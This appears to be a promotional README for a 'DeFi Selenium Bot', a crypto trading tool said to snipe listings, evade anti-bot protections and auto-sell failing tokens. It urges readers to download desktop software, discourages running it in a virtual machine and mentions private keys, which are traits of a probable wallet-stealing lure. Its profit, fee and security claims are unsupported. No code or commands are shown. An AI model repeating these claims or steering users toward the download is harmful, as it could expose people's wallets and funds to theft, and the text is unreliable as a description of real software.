## Mission

Optimize profits, minimize risks, and make DeFi more accessible and profitable for all.

## Introduction

DeFi Selenium Bot is an innovative solution designed to optimize crypto assets and maximize profits. It offers a wide range of features, including coin sniping on listing, profitable swap and trading, making it a comprehensive tool for managing DeFi assets.


## Key Features
- üìà Instant trading. When you trade manually through trust wallet or metamask wallets, you spend 20 to 60 seconds on the token verification and transaction confirmation processes. With our bot, the processes of selling and buying is instant, because they go directly to the network of the validator
- üîá Counter anti-bot protections
- üîã Scam protection. Have you ever bought a token that lost its value after a while? This is not a problem with our bot - add the contract address of the token to the bot to track a rapid sale or liquidity withdrawal. If the price drops by more than 20%-(the rate is adjustable), our bot will automatically sell this token
- üíé Snipe Pinksale listings
- üõ† Create fully automated strategies to BUY THE DIP and use TRAILING STOP LOSS
- üîë Place Limit Orders
- üçî Liquidity Farms. Minimize fees within any network by calculating the recent blocks farmed to indicate the lowest fee to the miner. This way you will be able to reduce the fee when farming in the ETH network to $1.

### Bank-Level Security

All transactions and asset storage are protected by robust security protocols, ensuring peace of mind.

To unlock the full functionality, it is recommended to download the software to your desktop.
This is necessary to protect transactions and the user from the anti-bot system

The reason for this is that running the software on your own computer gives you more control over the trading process and protects you from anti-bot systems that are designed to prevent automated trading

Anti-bot systems are used by some cryptocurrency exchanges to prevent bots from manipulating the market or engaging in unfair trading practices. By downloading the software to your own computer, you can avoid these anti-bot systems and trade more effectively

It is not recommended to use a virtual machine to preserve the integrity of private key encryption, fast connection, and stable operation of the program.

## Sniping Coins at Listing

The listing sniping feature automates the purchase of coins as soon as they are listed on exchanges. This provides opportunities to capitalize on the price spikes that often occur when new coins are listed. Users can customize parameters to automatically buy at predetermined prices and volumes.


## Beneficial Swap

The Beneficial Swap feature integrates with leading decentralized exchanges (DEX) to make swaps with minimal fees and slippage. DeFi STS-bot analyzes liquidity and commissions on multiple DEXs to find the best exchange rates. This saves users time and money and ensures that they get the best possible rates.


## Conclusion

DeFi Selenium Bot is the ultimate tool for optimizing profits and minimizing risks in DeFi. With its intuitive interface, automated strategies, personalized recommendations, support for leading cryptocurrencies, and bank-level security, it's the perfect solution for anyone looking to maximize their returns in the DeFi space.
